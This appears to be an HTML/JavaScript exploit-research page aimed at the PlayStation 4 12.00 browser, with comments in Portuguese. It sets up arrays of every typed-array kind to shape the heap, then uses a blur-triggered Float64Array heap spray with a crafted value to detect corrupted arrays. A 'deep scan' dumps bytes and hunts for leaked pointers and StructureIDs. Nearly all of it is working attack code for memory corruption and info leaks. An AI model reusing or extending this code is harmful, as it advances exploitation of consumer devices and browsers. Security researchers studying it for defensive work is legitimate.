<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 Multi-Type Deep Scan</title>
<style>
    body { font-family: sans-serif; background: #f0f0f0; color: #333; }
    code { background: #e0e0e0; padding: 2px 4px; border-radius: 4px; font-family: monospace; }
    .vuln { color: #d00; font-weight: bold; }
    .pointer { color: #0077ff; font-weight: bold; }
</style>
</head>
<body>

<h1>PS4 12.00 - MULTI-TYPE CORRUPTION & DEEP SCAN</h1>

<h2>SETUP: Create Arrays of All Types</h2>
<button onclick="setup()">CREATE ALL TYPES</button>
<div id="setup"></div>

<script>
var g_arrays = {
    Float64: [], Float32: [], BigUint64: [], BigInt64: [],
    Uint32: [], Int32: [], Uint16: [], Int16: [],
    Uint8: [], Int8: []
};

var g_corrupted = {};

function setup() {
    const r = document.getElementById('setup');
    r.innerHTML = 'Creating arrays of all types...<br>';
    const count = 500; 
    
    // Inicialização idêntica ao original para manter o heap layout
    for(let i = 0; i < count; i++) {
        g_arrays.Float64.push(new Float64Array(8));
        g_arrays.Float32.push(new Float32Array(8));
        g_arrays.BigUint64.push(new BigUint64Array(8));
        g_arrays.BigInt64.push(new BigInt64Array(8));
        g_arrays.Uint32.push(new Uint32Array(16));
        g_arrays.Int32.push(new Int32Array(16));
        g_arrays.Uint16.push(new Uint16Array(32));
        g_arrays.Int16.push(new Int16Array(32));
        g_arrays.Uint8.push(new Uint8Array(64));
        let i8 = new Int8Array(64);
        i8[0] = i % 128; // Valor de sanidade
        g_arrays.Int8.push(i8);
    }
    
    r.innerHTML += 'Created ' + (count * 10) + ' arrays (10 types)<br><br>';
    r.innerHTML += '<b>Press OPTIONS twice to corrupt</b><br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    let triggerCount = 0;
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += '<br>Trigger ' + triggerCount + '<br>';
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            for(let type in g_arrays) {
                const corrupted = g_arrays[type].filter(a => {
                    if(type.includes('Big')) return a[0] !== BigInt(g_arrays[type].indexOf(a));
                    if(type.includes('Float')) return a[0] === P;
                    if(type === 'Int8') return a[0] === 0 && g_arrays[type].indexOf(a) !== 0; 
                    return a[0] === 0 && g_arrays[type].indexOf(a) !== 0;
                });
                if(corrupted.length > 0) {
                    g_corrupted[type] = corrupted[0];
                    r.innerHTML += '<b>✓ ' + type + 'Array corrupted (' + corrupted.length + ' found)</b><br>';
                }
            }
            r.innerHTML += '<br><b>Corruption complete!</b><br>';
            window.onblur = null;
        }
    };
}
</script>

<hr>

<h2>TEST 5: Deep Scan (Int8Array Sensors)</h2>
<p>Utiliza a granularidade byte-a-byte para detectar metadados desalinhados.</p>
<button onclick="deep_scan_int8()">RUN DEEP SCAN</button>
<div id="deepscan"></div>

<script>
function deep_scan_int8() {
    const r = document.getElementById('deepscan');
    r.innerHTML = '<b>Scanning Int8Arrays for leaked metadata/pointers...</b><br><br>';

    if(g_arrays.Int8.length === 0) {
        r.innerHTML += '<span class="vuln">Run SETUP first!</span><br>';
        return;
    }

    let foundLeaks = 0;
    g_arrays.Int8.forEach((arr, idx) => {
        let isLeaked = false;
        let hexDump = "";
        const expected = idx % 128;

        // Analisa o buffer em busca de dados não-zero ou desvios do original
        for(let i = 0; i < arr.length; i++) {
            let val = arr[i] & 0xFF;
            if(i === 0 && arr[0] !== expected) isLeaked = true;
            if(i > 0 && val !== 0) isLeaked = true;
            
            if(isLeaked) hexDump += val.toString(16).padStart(2, '0') + " ";
        }

        if(isLeaked) {
            foundLeaks++;
            r.innerHTML += `<span class="vuln">[VULN] Leak detectado no Int8Array #${idx}</span><br>`;
            r.innerHTML += `Dump: <code>${hexDump}</code><br>`;

            // Procura por assinaturas de ponteiros (Little-Endian 0x7F...)
            for(let i = 0; i < arr.length - 1; i++) {
                if((arr[i] & 0xFF) === 0xFF && (arr[i+1] & 0xFF) === 0x7F) {
                    r.innerHTML += `<span class="pointer">[!] Possível ponteiro 0x7F... encontrado no offset ${i}</span><br>`;
                }
                // Procura por StructureIDs conhecidos (0x25, 0x108)
                if((arr[i] & 0xFF) === 0x25 || (arr[i] & 0xFF) === 0x08) {
                    r.innerHTML += `[i] Candidato a StructureID detectado no offset ${i}: 0x${(arr[i]&0xFF).toString(16)}<br>`;
                }
            }
            r.innerHTML += "<br>";
        }
    });

    if(foundLeaks === 0) r.innerHTML += "Nenhum dado extra encontrado nos sensores Int8.<br>";
}
</script>

<hr>
</body>
</html>
